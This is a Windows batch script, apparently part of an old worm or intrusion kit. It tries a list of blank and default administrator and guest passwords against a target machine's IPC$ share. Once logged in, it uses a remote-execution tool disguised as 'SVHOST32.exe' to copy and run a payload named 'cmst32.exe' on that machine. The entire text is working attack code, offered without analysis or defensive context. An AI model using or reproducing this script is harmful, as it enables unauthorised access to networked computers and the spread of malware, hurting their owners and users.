@echo off 
cd\ 
cd C:\WINNT 
cd system32 
net use \\%1\ipc$ "" /user:Administrator 
if not errorlevel 1 goto root 
net use \\%1\ipc$ "Administrator" /user:Administrator 
if not errorlevel 1 goto root 
net use \\%1\ipc$ "Administrator" /user:Admin 
if not errorlevel 1 goto root 
net use \\%1\ipc$ "" /user: 
if not errorlevel 1 goto root 
net use \\%1\ipc$ "" /user:admin 
if not errorlevel 1 goto root 
net use \\%1\ipc$ "admin" /user:Administrator 
if not errorlevel 1 goto root 
net use \\%1\ipc$ "" /user:administrateur 
if not errorlevel 1 goto root 
net use \\%1\ipc$ "administrateur" /user:administrateur 
if not errorlevel 1 goto root 
net use \\%1\ipc$ "" /user:Guest 
if not errorlevel 1 goto root 
:root 
SVHOST32.exe \\%1 -f -c -d cmst32.exe -o 
net use /del \\%1\ipc$ 
